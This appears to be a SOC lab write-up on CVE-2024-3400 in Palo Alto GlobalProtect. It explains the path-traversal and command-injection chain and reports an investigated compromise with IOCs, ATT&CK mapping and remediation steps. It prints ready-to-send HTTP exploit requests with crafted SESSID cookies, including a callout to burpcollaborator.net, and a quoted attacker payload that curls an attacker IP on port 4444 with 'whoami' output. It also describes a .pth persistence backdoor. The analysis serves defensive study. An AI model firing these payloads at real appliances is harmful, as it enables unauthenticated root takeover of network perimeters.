
### 🧠 Deep Dive: Understanding CVE-2024-3400 (Palo Alto OS Command Injection)

**Vendor Description:**
A command injection vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS software for specific PAN-OS versions and distinct feature configurations may enable an unauthenticated attacker to execute arbitrary code with root privileges on the firewall. *(Credit for exploit reverse-engineering: watchTowr Labs).*

CVE-2024-3400 is a devastating zero-day because it is an **Exploit Chain** relying on two distinct flaws working together.

**Vulnerability 1: Arbitrary File Creation via Path Traversal**
When a user interacts with GlobalProtect endpoints (such as `/ssl-vpn/hipreport.esp` or `/global-protect/login.esp`), the server assigns them a Session ID (`SESSID`) via a cookie. The Nginx web server component fails to sanitize this cookie. Attackers can use directory traversal (`../../../../`) to write an empty file *anywhere* on the Linux file system as the `root` user, completely controlling the filename.

<img width="799" height="434" alt="image" src="https://github.com/user-attachments/assets/6c892ae9-eb0f-4af2-a02d-5fd2fad509d8" />


*Path Traversal Check:*
```http
POST /ssl-vpn/hipreport.esp HTTP/1.1
Host: 127.0.0.1
Cookie: SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/poc.txt;
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
*If vulnerable, the file is created with root privileges. Accessing `GET /global-protect/portal/images/poc.txt` will return a `403 Forbidden` instead of a `404 Not Found`, confirming the file exists.*

**Vulnerability 2: OS Command Injection via Filename Execution (RCE)**
Palo Alto firewalls have a scheduled cronjob that runs Device Telemetry scripts. When this service looks inside its temporary folder (`/opt/panlogs/tmp/device_telemetry/minute/`) to package files, it passes the *filenames* to a Python subprocess using `shell=True`. By injecting backticks `` ` `` into the crafted cookie, the attacker forces the server to execute the filename as a shell command.

*RCE Check (Requires Telemetry Enabled):*
```http
POST /ssl-vpn/hipreport.esp HTTP/1.1
Host: 127.0.0.1
Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/hellothere226`hostname${IFS}burpcollaborator.net`;
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

---

# SOC-3400 - Palo Alto GlobalProtect OS Command Injection [CVE-2024-3400]

## Alert Overview
- **Severity:** Critical
- **Detection Source:** SIEM / Network Traffic Analysis
- **Asset Affected:** 172.16.17.139 (Palo Alto GlobalProtect Appliance)
- **Threat Type:** Zero-Day Exploitation / Remote Code Execution (RCE)
- **Status:** True Positive (Compromised)

## Strategy and Technical Context
The strategy observed in this incident targets perimeter security infrastructure. By compromising the VPN gateway itself, the threat actor bypasses all internal segmentation and gains a "god-level" foothold directly on the edge of the network. The technical execution relies on exploiting CVE-2024-3400, dropping a Python-based backdoor (`update.py`), and establishing persistence by hijacking Python's `.pth` (path configuration) mechanism so the backdoor loads automatically whenever Python is invoked on the firewall.

## Investigation Steps

### 1. Alert Triage and Network Log Analysis
The investigation began with an alert for suspicious activity originating from `144.172.79.92`. 
- **Firewall Logs:** The Nginx access logs (`sslvpn_access.log`) showed inbound POST requests from the attacker targeting `/global-protect/login.esp` and `/global-protect/logout.esp`.
- **User-Agent:** The requests utilized `curl/8.4.0`, indicating automated scripted interaction rather than a standard web browser.

### 2. Payload Deconstruction (The Exploit)
Deep inspection of the raw HTTP headers revealed the malicious `SESSID` cookie used to trigger the path traversal and file creation:
- **Payload:** `SESSID=../../../../../opt/panlogs/tmp/device_telemetry/hour/aaa`curl${IFS}144.172.79.92:4444?user=$(whoami)`
- **Analysis:** The attacker forces the firewall to create a file in the `device_telemetry` folder. The filename includes a `curl` command calling back to the attacker's IP on port `4444`, passing the output of the `whoami` command. The attacker uses `${IFS}` (Internal Field Separator) instead of spaces to ensure the filename doesn't break the HTTP request formatting.

### 3. Execution Verification (Telemetry Logs)
To confirm if the second phase of the exploit executed, the internal device telemetry logs were queried.
- **Finding:** Logs from `dt_send` show the cronjob picking up the maliciously named file: `send file dir: fname: /opt/panlogs/tmp/device_telemetry/day/aaa`curl...`
- **Result:** The log explicitly records the execution of the `dt_curl` utility processing the file. This confirms the OS Command Injection successfully triggered.

### 4. Post-Exploitation and Persistence (EDR)
The investigation pivoted to Endpoint/Process tracking on the appliance to identify post-exploitation actions.
- **Process Creation:** A malicious Python script was executed: `/usr/bin/python3 update.py`. 
- **Threat Intel:** The hash of `update.py` (`3de2a4392...`) was queried on VirusTotal, yielding 38/62 malicious detections, specifically tagged as a `cve-2024-3400` payload.
- **Persistence:** System analysis revealed the script created a backdoor at `/usr/lib/python3.6/site-packages/system.pth`, ensuring the attacker maintains persistent root access to the appliance across reboots.

## Analysis and Findings
The incident is a confirmed **True Positive (Successful)**. The threat actor successfully chained an arbitrary file creation vulnerability with an OS command injection flaw (CVE-2024-3400) to achieve unauthenticated root Remote Code Execution on the organization's Palo Alto VPN gateway. The initial `curl` payload facilitated the download of a secondary Python backdoor (`update.py`), which established deep system persistence. The perimeter is fully compromised.

## MITRE ATT&CK Mapping
| Tactic | Technique ID | Technique Name |
| :--- | :--- | :--- |
| **Initial Access** | T1190 | Exploit Public-Facing Application |
| **Execution** | T1059.004 | Command and Scripting Interpreter: Unix Shell |
| **Persistence** | T1546 | Event Triggered Execution (Python `.pth` hijack) |
| **Defense Evasion** | T1036 | Masquerading (Naming payload `update.py`) |

## Indicators of Compromise (IOCs)
| Type | Value | Context |
| :--- | :--- | :--- |
| IP Address | 144.172.79.92 | Attacker Source IP / C2 Server |
| Port | 4444 | Malicious callback port |
| Hash (SHA256) | `3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac` | Python Backdoor (`update.py`) |
| File Path | `/usr/lib/python3.6/site-packages/system.pth` | Persistence mechanism |
| String | `SESSID=../../../../../opt/panlogs/` | Exploitation signature |

## Blind Spots
- **Internal Lateral Movement:** With root access on the VPN gateway, the attacker has unrestricted visibility into internal network traffic traversing the VPN. Full internal packet capture and flow logs must be reviewed to determine if the attacker pivoted from the firewall to internal Active Directory infrastructure.

## False Positives: Legitimate Activity Comparison
- There are absolutely no false positives for a `SESSID` cookie attempting to traverse to `/opt/panlogs/`. Any presence of this string in network logs is a definitive exploit attempt.

## Mistakes and Lessons Learned
- **Analyst Reflection:** Traditional Command Injection analysis looks for commands passed in URL parameters or POST bodies. 
- **The Lesson:** This CVE teaches a masterclass in lateral thinking: **A filename can be a payload.** Because the Linux shell parses strings based on context, injecting backticks `` ` `` into a filename turns a simple file-read operation into arbitrary code execution. As an analyst, you must monitor not just what data is being sent, but *where* the application writes that data, and *what* downstream services (like cronjobs) might interact with it later.

## Response and Closure
- **Action Taken:** The compromised Palo Alto appliance (`172.16.17.139`) was immediately isolated from the network. Incident escalated to Tier-2 / Incident Response.
- **Containment Required:** Yes.
- **Closure Reason:** True Positive. Critical zero-day exploitation and persistence achieved.

## Recommendations
1. **Immediate Firmware Patching:** Upgrade PAN-OS to the latest hotfix provided by Palo Alto Networks mitigating CVE-2024-3400.
2. **Mitigation Workaround:** If patching cannot be done immediately, temporarily disable the "Device Telemetry" feature on the firewall, as this breaks the second half of the exploit chain (Vuln #2).
3. **Forensic Rebuild:** Because the attacker achieved root access and dropped a `.pth` persistence mechanism, the appliance cannot be trusted. It must be factory reset, completely rebuilt from a known-good backup, and patched before being reintroduced to the perimeter.
4. **Credential Rotation:** Rotate all VPN user credentials and internal service accounts that may have passed through the firewall during the compromise window.

## Evidence / Screenshots
<img width="882" height="322" alt="image" src="https://github.com/user-attachments/assets/eface185-c628-449e-ab09-6a3335667464" />
<img width="460" height="250" alt="image" src="https://github.com/user-attachments/assets/cb5b89d4-2b86-4e2e-aea7-868007d0f937" />
<img width="500" height="250" alt="image" src="https://github.com/user-attachments/assets/78335579-9d00-47c5-ba83-e5a868929b0d" />
<img width="500" height="250" alt="image" src="https://github.com/user-attachments/assets/c344b349-294f-43d4-9acb-c11c85edaba7" />
<img width="500" height="250" alt="image" src="https://github.com/user-attachments/assets/c78eaaf1-a936-4dbd-9d35-d68c18b53b95" />
<img width="800" height="200" alt="image" src="https://github.com/user-attachments/assets/9445a8e2-5e38-46de-8bcf-5d380c78e2d2" />
<img width="500" height="250" alt="image" src="https://github.com/user-attachments/assets/7fabc69b-22a4-4568-9ad6-7ccf812aa6f1" />


## Skills & Tools Used
SIEM Log Correlation (Nginx/Appliance Logs), Advanced Vulnerability Triage (CVE-2024-3400), Reverse Engineering (Exploit Chains), Threat Intelligence, Incident Response, Linux Forensics.
